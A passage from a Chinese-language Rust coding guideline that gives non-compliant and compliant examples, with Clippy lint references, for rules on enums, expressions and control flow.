    fn on_yellow(self) -&gt; ColoredString {
        ColoredString {
            bgcolor: String::from(&quot;43&quot;),
            input: String::from(self),
            fgcolor: String::default();
        }   
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
impl&lt;'a&gt; Colorize for &amp;'a str {
    fn red(self) -&gt; ColoredString {
        ColoredString {
            fgcolor: String::from(&quot;31&quot;),
            input: String::from(self),
            ..ColoredString::default() // 通过该语法，开发者可以快速了解该方法只更新 fgcolor 和 input，也不需要指派其他不需要更新的字段，更加方便
        }   
    }
    fn on_yellow(self) -&gt; ColoredString {
        ColoredString {
            bgcolor: String::from(&quot;43&quot;),
            input: String::from(self),
            ..ColoredString::default()
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#field_reassign_with_default">field_reassign_with_default</a></td><td>yes</td><td>no</td><td>style</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="枚举体"><a class="header" href="#枚举体">枚举体</a></h1>
<p>Rust 的枚举是一种带 Tag 的联合体。 一般分为三类：空枚举、无字段（fieldless）枚举和数据承载（data carrying）枚举。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypenm01-合理使用map和and_then方法"><a class="header" href="#gtypenm01-合理使用map和and_then方法">G.TYP.ENM.01 合理使用<code>map</code>和<code>and_then</code>方法</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>在标准库中内置的一些 Enum 类型中提供了一些方便的组合算子，比如 <code>map</code> 和 <code>and_then</code>。</p>
<ul>
<li><code>map</code> ，函数签名是 <code>fn map&lt;U, F&gt;(self, f: F) -&gt; Option&lt;U&gt; where F: FnOnce(T) -&gt; U</code> 。</li>
<li><code>and_then</code> ，函数签名是 <code>fn and_then&lt;U, F&gt;(self, f: F) -&gt; Option&lt;U&gt; where F: FnOnce(T) -&gt; U</code> 。</li>
</ul>
<p><code>Result</code> 中实现的 <code>map/and_then</code> 函数签名也和 <code>Option</code> 一致。这两个方法之间的区别在于传入的闭包参数的返回值类型不同。</p>
<p>这意味着：</p>
<ul>
<li>当你通过 <code>F</code> 对 <code>U</code> 进行 <code>map</code> 转换的时候，意味着这个转换是一定会成功的。</li>
<li>当你通过 <code>F</code> 对 <code>U</code> 进行 <code>and_then</code> 转换的时候，意味着这个转换是不一定会成功的，需要在 <code>F</code> 调用之后对其结果 <code>Option&lt;U&gt;/Result&lt;U&gt;</code> 进行处理。</li>
</ul>
<p>在合适的场景中选择合适的组合算子，可以让代码更加简洁，提升可读性和可维护性。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合： 当前这种情况是一定会成功的情况，应该使用 map
fn opt() -&gt; Option&lt;&amp;'static str&gt; { Some(&quot;42&quot;) }
fn res() -&gt; Result&lt;&amp;'static str, &amp;'static str&gt; { Ok(&quot;42&quot;) }
let _ = opt().and_then(|s| Some(s.len()));
let _ = res().and_then(|s| if s.len() == 42 { Ok(10) } else { Ok(20) });
let _ = res().or_else(|s| if s.len() == 42 { Err(10) } else { Err(20) });

<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
fn opt() -&gt; Option&lt;&amp;'static str&gt; { Some(&quot;42&quot;) }
fn res() -&gt; Result&lt;&amp;'static str, &amp;'static str&gt; { Ok(&quot;42&quot;) }
let _ = opt().map(|s| s.len());
let _ = res().map(|s| if s.len() == 42 { 10 } else { 20 });
let _ = res().map_err(|s| if s.len() == 42 { 10 } else { 20 });
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#bind_instead_of_map">bind_instead_of_map </a></td><td>yes</td><td>no</td><td>complexity</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypenm02-不应自行创建空枚举"><a class="header" href="#gtypenm02-不应自行创建空枚举">G.TYP.ENM.02 不应自行创建空枚举</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>在 Rust 中 只有 <code>never</code> 类型（<code>!</code>）才是唯一合法表达 无法被实例化类型 的类型。但目前 <code>never</code> 类型还未稳定，只能在 Nightly 下使用。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![feature(never_type)] // 当启用该功能的时候，下面的clippy才会生效
#![warn(clippy::empty_enum)]

<span class="boring">fn main() {
</span>// 不符合
enum Test {}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<p>所以，如果想在稳定版 Rust 中使用，建议使用<a href="https://doc.rust-lang.org/std/convert/enum.Infallible.html#"><code>std::convert::Infallible</code></a> 。 <code>Infallible</code> 枚举是一个合法的空枚举，常用于错误处理中，表示永远不可能出现的错误。但是目前也可以用于在稳定版中替代  <code>never</code>   类型。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![feature(never_type)] // 当启用该功能的时候，下面的clippy才会生效
#![warn(clippy::empty_enum)]

<span class="boring">fn main() {
</span>//符合： 未来 never 类型稳定的话，将会把 Infallible 设置为 never 类型的别名
pub type Infallible = !;
<span class="boring">}
</span></code></pre></pre>
<p><strong>【例外】</strong></p>
<p>因为 <a href="https://doc.rust-lang.org/std/convert/enum.Infallible.html#"><code>std::convert::Infallible</code></a> 默认实现了很多 trait，如果不想依赖其他 trait ，那么可以用 空枚举。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![feature(never_type)] // 当启用该功能的时候，下面的clippy才会生效
#![allow(clippy::empty_enum)]
<span class="boring">fn main() {
</span>pub enum NoUserError {}

impl Display for NoUserError {
    fn fmt(&amp;self, _formatter: &amp;mut fmt::Formatter) -&gt; fmt::Result {
        match *self {}
    }
}

<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#empty_enum">empty_enum</a></td><td>yes</td><td>no</td><td><strong>pedantic</strong></td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypenm03--在使用类似-c-语言的枚举写法且使用reprisizeusize-布局时注意-32位架构上截断的问题"><a class="header" href="#gtypenm03--在使用类似-c-语言的枚举写法且使用reprisizeusize-布局时注意-32位架构上截断的问题">G.TYP.ENM.03  在使用类似 C 语言的枚举写法且使用<code>repr(isize/usize)</code> 布局时注意 32位架构上截断的问题</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>在使用类似 C 语言的枚举写法且使用<code>repr(isize/usize)</code> 布局时，在32位架构上会截断变体值，但在64位上工作正常。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>
<span class="boring">fn main() {
</span>#[repr(usize)]
enum NonPortable {
    X = 0x1_0000_0000, // 不符合：如果在 32位架构上会截断变体值，导致该指针地址变化
    Y = 0,
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<p>因为当前 lint 默认是<code> deny</code>，所以需要将其配置为 <code>allow</code>。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![allow(clippy::enum_clike_unportable_variant)]

<span class="boring">fn main() {
</span>#[repr(isize)]
pub enum ZBarColor {
    ZBarSpace = 0, // 符合：因为值足够小，没有截断风险
    ZBarBar   = 1,
}

// 符合：没有指定 repr(isize/usize)
#[allow(clippy::enum_clike_unportable_variant)]
pub(crate) enum PropertyType {
    ActionItemSchemaVersion = 0x0C003473,
    ActionItemStatus = 0x10003470,
    ActionItemType = 0x10003463,
    Author = 0x1C001D75,
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#enum_clike_unportable_variant">enum_clike_unportable_variant</a></td><td>yes</td><td>no</td><td>correctness</td><td>deny</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypenm04-不宜在use语句中引入enum的全部变体variants"><a class="header" href="#gtypenm04-不宜在use语句中引入enum的全部变体variants">G.TYP.ENM.04 不宜在<code>use</code>语句中引入Enum的全部变体（variants）</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>使用 Enum 的类型前缀可以使代码更加可读。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::enum_glob_use)]

<span class="boring">fn main() {
</span>// 不符合
use std::cmp::Ordering::*; // 这里导入了全部变体
foo(Less);
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::enum_glob_use)]

<span class="boring">fn main() {
</span>// 符合
use std::cmp::Ordering;
foo(Ordering::Less)


<span class="boring">}
</span></code></pre></pre>
<p><strong>【例外】</strong></p>
<p>当枚举体非常多的时候，比如 <a href="https://docs.rs/crate/oci-spec/0.5.1/source/src/runtime/linux.rs#:%7E:text=clippy%3a%3aenum_clike_unportable_variant">oci_spec::Arch</a> 中对应平台架构的枚举值，直接用 <code>*</code> 导入会更加方便。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// From:  https://github.com/alacritty/alacritty/blob/master/alacritty/src/config/bindings.rs#L368
#![allow(clippy::enum_glob_use)]
use oci_spec::Arch::*;

pub enum Arch {
    /// The native architecture.
    ScmpArchNative = 0x00000000,

    /// The x86 (32-bit) architecture.
    ScmpArchX86 = 0x40000003,

    /// The x86-64 (64-bit) architecture.
    ScmpArchX86_64 = 0xc000003e,

    // ... more 
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#enum_glob_use">enum_glob_use</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypenm05-对外导出的公开enum宜添加non_exhaustive属性"><a class="header" href="#gtypenm05-对外导出的公开enum宜添加non_exhaustive属性">G.TYP.ENM.05 对外导出的公开Enum，宜添加<code>#[non_exhaustive]</code>属性</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>作为对外公开的 Enum，为了保持稳定性，应该使用 <code>#[non_exhaustive]</code>属性，避免因为将来Enum 枚举变体的变化而影响到下游的使用。</p>
<p><strong>【反例】</strong></p>
<p>在 <code>#[non_exhaustive]</code> 属性稳定之前，社区内还有一种约定俗成的写法来达到防止下游自定义枚举方法。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::exhaustive_enums)]

<span class="boring">fn main() {
</span>enum E {
    A,
    B,
    #[doc(hidden)]
    _C, // 不符合： 这里用 下划线作为前缀定义的变体，作为隐藏的变体，不对外展示
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
#[non_exhaustive]
enum E {
    A,
    B,
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#exhaustive_enums">exhaustive_enums</a></td><td>yes</td><td>no</td><td>restriction</td><td>allow</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#manual_non_exhaustive">manual_non_exhaustive</a></td><td>yes</td><td>no</td><td>style</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypenm06--enum内变体的大小差异不宜过大"><a class="header" href="#gtypenm06--enum内变体的大小差异不宜过大">G.TYP.ENM.06  Enum内变体的大小差异不宜过大</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>要注意 Enum 内变体的大小差异不要过大，因为 Enum 内存布局是以最大的变体进行对齐。根据场景，如果该Enum 实例中小尺寸变体的实例使用很多的话，内存就会有所浪费。如果小尺寸变体的实例使用很少，则影响不大。</p>
<p>解决办法之一为把大尺寸变体包含到 <code>Box&lt;T&gt;</code>中。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
enum Test {
    A(i32),
    B([i32; 1000]),
    C([i32; 8000]),
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
enum Test {
    A(i32),
    B(Box&lt;[i32; 1000]&gt;),
    C(Box&lt;[i32; 8000]&gt;),
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#large_enum_variant">large_enum_variant</a></td><td>yes</td><td>no</td><td>perf</td><td>warn</td></tr>
</tbody></table>
<p>该 lint 可以通过 clippy 配置项 <code>enum-variant-size-threshold = 200</code> 来配置，默认是 <code>200</code> 字节。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypenm07-如需依赖-enum-中变体的序数则应为变体设置明确的数值"><a class="header" href="#gtypenm07-如需依赖-enum-中变体的序数则应为变体设置明确的数值">G.TYP.ENM.07 如需依赖 Enum 中变体的序数，则应为变体设置明确的数值</a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>在日常开发中，有时需要产生出有独立名称，且为连续或是有规律的数值，用来当作接口的参数数值，一般采用枚举（Enum）来实现。</p>
<p>Rust 语言的枚举变体的序数（ordinal）依赖于它的定义顺序。在开发过程中，很有可能需要新增变体。一般情况下，都是从尾部追加变体，但不排除有人会从中间新增变体，或者，依赖于某些库将变体自动按字典序排序，这样就有可能打乱枚举变体本来到顺序，导致程序中依赖变体序数的代码产生逻辑错误。</p>
<p>所以，在这种情况下，我们需要为变体设置明确的数值</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">// 不符合
enum Mode {
    Mode0, // 0
    Mode1, // 1
    Mode3, // 2
    Mode2, // 3
}
 
fn main() {
    // 不符合：报错，此处 Mode::Mode3 对应值为 2 ，而不是 3
    assert_eq!(3, Mode::Mode3 as u8);
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">// 符合
enum Mode {
    Mode0 = 0, 
    Mode1 = 1, 
    Mode3 = 3, 
    Mode2 = 2, 
}
 
fn main() {
    // 符合
    assert_eq!(3, Mode::Mode3 as u8);
}

</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="35-表达式"><a class="header" href="#35-表达式">3.5 表达式</a></h1>
<p>Rust 中几乎一切皆表达式。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gexp01-当需要对表达式求值后重新赋值时宜使用复合赋值模式"><a class="header" href="#gexp01-当需要对表达式求值后重新赋值时宜使用复合赋值模式">G.EXP.01 当需要对表达式求值后重新赋值时，宜使用复合赋值模式</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>略</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let mut a = 5;
let b = 0;
a = a + b; // 不符合
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let mut a = 5;
let b = 0;
a += b; // 符合
<span class="boring">}
</span></code></pre></pre>
<p>【Lint 检测】</p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#assign_op_pattern">assign_op_pattern</a></td><td>yes</td><td>no</td><td>style</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gexp02--不宜在比较中使用不兼容的位掩码"><a class="header" href="#gexp02--不宜在比较中使用不兼容的位掩码">G.EXP.02  不宜在比较中使用不兼容的位掩码</a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>如果比较的位总是被位掩码设置为零或一，则比较是常量true或 false（取决于掩码、比较值和运算符），这种代码是有误导性的，可能是故意这么写用于赢得一场性能竞赛或者是通过一个测试用例。</p>
<p>可以对照下面表格进行检查。</p>
<table><thead><tr><th>Comparison</th><th>Bit Op</th><th>Example</th><th>is always</th><th>Formula</th></tr></thead><tbody>
<tr><td>== or !=</td><td>&amp;</td><td>x &amp; 2 == 3</td><td>false</td><td>c &amp; m != c</td></tr>
<tr><td>&lt; or &gt;=</td><td>&amp;</td><td>x &amp; 2 &lt; 3</td><td>true</td><td>m &lt; c</td></tr>
<tr><td>&gt; or &lt;=</td><td>&amp;</td><td>x &amp; 1 &gt; 1</td><td>false</td><td>m &lt;= c</td></tr>
<tr><td>== or !=</td><td>|</td><td>x | 1 == 0</td><td>false</td><td>c | m != c</td></tr>
<tr><td>&lt; or &gt;=</td><td>|</td><td>x | 1 &lt; 1</td><td>false</td><td>m &gt;= c</td></tr>
<tr><td>&lt;= or &gt;</td><td>|</td><td>x | 1 &gt; 0</td><td>true</td><td>m &gt; c</td></tr>
</tbody></table>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let x = 2;
// 不符合：该表达式会永远是 false
if (x &amp; 1 == 2) { }
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let x = 2;
// 符合
if (x == 2) { }
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#bad_bit_mask">bad_bit_mask</a></td><td>yes</td><td>no</td><td>correctness</td><td>deny</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gexp03-不应利用数组表达式的边界检查来-panic而应使用断言"><a class="header" href="#gexp03-不应利用数组表达式的边界检查来-panic而应使用断言">G.EXP.03 不应利用数组表达式的边界检查来 Panic，而应使用断言</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>这样会影响代码可读性。使用断言可以更好的描述代码的意图。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">fn main(){
   // 不符合
   [42, 55][get_usize()];
   compute_array()[0];
}

fn get_usize() -&gt; usize {
   6
}

fn compute_array() -&gt; [i32; 3] {
   [1,2,3]
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">fn main(){
   // 符合
   assert!([42, 55].len() &gt; get_usize());
   assert!(compute_array().len() &gt; 0);
}

fn get_usize() -&gt; usize {
   6
}

fn compute_array() -&gt; [i32; 3] {
   [1,2,3]
}
</code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#unnecessary_operation">unnecessary_operation</a></td><td>yes</td><td>no</td><td><strong>complexity</strong></td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gexp04-自增或自减运算使用或-"><a class="header" href="#gexp04-自增或自减运算使用或-">G.EXP.04 自增或自减运算使用<code>+=</code>或<code>-=</code></a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>C/Cpp 等编程语言常用的自增自减操作，如 <code>++i</code> 、<code>i++</code> 、<code>i--</code> 等不是合法的 Rust 表达式， <code>--i</code> 虽然是合法的 Rust 表达式，但是表达对i取反两次，而不是自减语义。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let mut x = 3;
--x; // 不符合：x 的值还是 3
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let mut x = 3;
x -= 1; // 符合
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#double_neg">double_neg</a></td><td>yes</td><td>no</td><td>style</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gexp05-使用括号来清楚表示表达式的计算顺序"><a class="header" href="#gexp05-使用括号来清楚表示表达式的计算顺序">G.EXP.05 使用括号来清楚表示表达式的计算顺序</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>并不是每个人都能记得住优先级，所以最好使用括号把优先级顺序区分出来，增加可读性。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>1 &lt;&lt; 2 + 3 // 不符合
-1i32.abs() // 不符合
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>(1 &lt;&lt; 2) + 3  // 符合
(-1i32).abs() // 符合
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#precedence">precedence</a></td><td>yes</td><td>no</td><td>complexity</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gexp06-避免在比较中添加无用的掩码操作"><a class="header" href="#gexp06-避免在比较中添加无用的掩码操作">G.EXP.06 避免在比较中添加无用的掩码操作</a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>检查比较中的无用位掩码操作，可以在不改变结果的情况下删除该位掩码操作。</p>
<p>请对照下面表格进行检查。</p>
<table><thead><tr><th>Comparison</th><th>Bit Op</th><th>Example</th><th>equals</th></tr></thead><tbody>
<tr><td>&gt; / &lt;=</td><td>| / ^</td><td>x | 2 &gt; 3</td><td>x &gt; 3</td></tr>
<tr><td>&lt; / &gt;=</td><td>| / ^</td><td>x ^ 1 &lt; 4</td><td>x &lt; 4</td></tr>
</tbody></table>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
if (x | 1 &gt; 3) {  }
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
if (x &gt; 3) {  }
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#ineffective_bit_mask">ineffective_bit_mask</a></td><td>yes</td><td>no</td><td>correctness</td><td><strong>deny</strong></td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="36-控制流程"><a class="header" href="#36-控制流程">3.6 控制流程</a></h1>
<p>Rust中流程控制也是属于表达式，但在本规范中将其独立出来。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pctf01-避免滥用迭代器"><a class="header" href="#pctf01-避免滥用迭代器">P.CTF.01 避免滥用迭代器</a></h2>
<p><strong>【描述】</strong></p>
<p>迭代器虽然是 Rust 中比较推崇的方式，但也没必要过度使用它。总之，如果使用迭代器让代码太复杂，就考虑换个非迭代器的方式实现吧。</p>
<p><strong>【反例】</strong></p>
<p>创建一个 Matrix变换的函数，但是这种迭代器的方式，代码可读性相比于命令式更困难。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// From : https://adventures.michaelfbryan.com/posts/rust-best-practices/bad-habits/#overusing-iterators
pub fn functional_blur(input: &amp;Matrix) -&gt; Matrix {
    assert!(input.width &gt;= 3);
    assert!(input.height &gt;= 3);

    let mut rows = input.rows();
    let first_row = rows.next().unwrap();
    let last_row = rows.next_back().unwrap();

    let top_row = input.rows();
    let middle_row = input.rows().skip(1);
    let bottom_row = input.rows().skip(2);

    let blurred_elements = top_row
        .zip(middle_row)
        .zip(bottom_row)
        .flat_map(|((top, middle), bottom)| blur_rows(top, middle, bottom));

    let elements: Vec&lt;f32&gt; = first_row
        .iter()
        .copied()
        .chain(blurred_elements)
        .chain(last_row.iter().copied())
        .collect();

    Matrix::new_row_major(elements, input.width, input.height)
}

fn blur_rows&lt;'a&gt;(
    top_row: &amp;'a [f32],
    middle_row: &amp;'a [f32],
    bottom_row: &amp;'a [f32],
) -&gt; impl Iterator&lt;Item = f32&gt; + 'a {
    // 不符合： 使用迭代器处理矩阵变换，代码不直观

    let &amp;first = middle_row.first().unwrap();
    let &amp;last = middle_row.last().unwrap();

    let top_window = top_row.windows(3);
    let middle_window = middle_row.windows(3);
    let bottom_window = bottom_row.windows(3);

    let averages = top_window
        .zip(middle_window)
        .zip(bottom_window)
        .map(|((top, middle), bottom)| top.iter().chain(middle).chain(bottom).sum::&lt;f32&gt;() / 9.0);

    std::iter::once(first)
        .chain(averages)
        .chain(std::iter::once(last))
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<p>创建一个 Matrix变换的函数，使用命令式风格，代码功能比较明确，更加直观。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// From: https://adventures.michaelfbryan.com/posts/rust-best-practices/bad-habits/#overusing-iterators
pub fn imperative_blur(input: &amp;Matrix) -&gt; Matrix {
    assert!(input.width &gt;= 3);
    assert!(input.height &gt;= 3);

    let mut output = input.clone();

    for y in 1..(input.height - 1) {
        for x in 1..(input.width - 1) {
            let mut pixel_value = 0.0;

            // 符合： 直接使用数组计算坐标更加直观方便
            pixel_value += input[[x - 1, y - 1]];
            pixel_value += input[[x, y - 1]];
            pixel_value += input[[x + 1, y - 1]];

            pixel_value += input[[x - 1, y]];
            pixel_value += input[[x, y]];
            pixel_value += input[[x + 1, y]];

            pixel_value += input[[x - 1, y + 1]];
            pixel_value += input[[x, y + 1]];
            pixel_value += input[[x + 1, y + 1]];

            output[[x, y]] = pixel_value / 9.0;
        }
    }

    output
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pctf02-优先使用模式匹配而非判断后再取值"><a class="header" href="#pctf02-优先使用模式匹配而非判断后再取值">P.CTF.02 优先使用模式匹配而非判断后再取值</a></h2>
<p><strong>【描述】</strong></p>
<p>Rust 中 模式匹配 是惯用法，而不是通过 <code>if</code> 判断值是否相等。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let opt: Option&lt;_&gt; = ...;
// 不符合
if opt.is_some() {
  let value = opt.unwrap();
  ...
}

// 不符合
let list: &amp;[f32] = ...;

if !list.is_empty() {
  let first = list[0];
  ...
}

<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
